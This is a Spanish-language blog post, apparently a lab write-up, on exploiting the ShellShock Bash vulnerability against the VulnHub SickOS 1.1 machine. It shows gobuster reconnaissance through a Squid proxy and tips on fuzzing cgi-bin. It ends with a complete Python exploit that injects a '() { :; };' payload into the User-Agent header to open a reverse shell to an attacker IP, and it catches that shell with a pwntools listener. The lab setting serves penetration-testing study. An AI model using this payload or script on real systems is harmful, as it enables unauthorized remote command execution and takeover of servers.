---
title: "Ataque ShellShock"
author: Tuch0
date: 2023-09-17
categories: [Vectores-de-Ataque]
tags: [shellSock]
image:
    path: ../../assets/Miniaturas/VectoresDeAtaque/shellshock.jpg
    width: 800
    height: 500
---


#### Desplegamos el laboratorio

```bash
# Descargamos el comprimido
https://www.vulnhub.com/entry/sickos-11,132/

# Importamos la ova 
# 1. VMware
# 2. VirtualBox
```

### ¿Que és?

> Es una vulnerabilidad en el Shell Bash de los sistemas operativos Linux / Unix, el cual **permite ejecutar comandos por atacantes de manera remota, por lo que se le conoce también con el nombe de Bashdoor.**
{: .prompt-info }

### Reconocimiento Web

```bash
# Comando
gobuster dir -u http.//192.168.0.116 --proxy http.//192.168.0.116:3128 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash

# Output
![](../../assets/VectoresDeAtaque/Ataque-ShellShock/1.jpg)
```

> Normalmente , si encuentras un **/cgi-bin** , puede ser factible testear un **"SellShock"**
{: .prompt-info }

![](../../assets/VectoresDeAtaque/Ataque-ShellShock/2.jpg)

> Normalmente , cuando descubrimos el directorio "cgi-bin" , prueba a hacer fuzzing buscando archivos con extensiones como: "pl,sh,cgi"
{: .prompt-info }

![](../../assets/VectoresDeAtaque/Ataque-ShellShock/3.jpg)

### Explotación

![](../../assets/VectoresDeAtaque/Ataque-ShellShock/4.jpg)

![](../../assets/VectoresDeAtaque/Ataque-ShellShock/5.jpg)

> Como vemos si tiene una versión antigua de shell , nosotros desde una cabecera le podemos incorporar un comando , cabe destacar que si no muestra nada por pantalla , lo que tenemos que hacer es añadirle un "echo" antes de el comando , y si no funciona añadimos otro , hasta que funcione.
{: .prompt-info }

![](../../assets/VectoresDeAtaque/Ataque-ShellShock/6.jpg)

### Exploit Automatizado

```python
#!/usr/bin/pytho3


# Importamos las librerias
import sys, signal, requests, threading
from pwn import *

# Funciones
def def_handler(sig, fram):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


# Variable generales
main_url = "http://127.0.0.1"
squid_proxy = {'http':"http://192.168.0.116:3128"}
lport = 443


# Funciones
def shellshock_attack():

        # Indicamos la cabecera
        headers = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.114/443 0>&1'"}

        # Creamos la petición
        r = requests.get(main_url, headers=headers, proxies=squid_proxy)



    

# Definimos flujo de el programa
if __name__ == "__main__":

    try:
        # Llamamos a la funciòn principal
        threading.Thread(target=shellshock_attack, args=()).start()
    except Exception as e:
        log.error(str(e))
    
    # Nos ponemos en escucha
    shell = listen(lport, timeout=20).wait_for_connection()

    # Validamos si a habido conexión
    if shell.sock is None:
        log.failure("No se puedo establecer conexión")
        sys.exit(1)
    else:
        shell.interactive()

```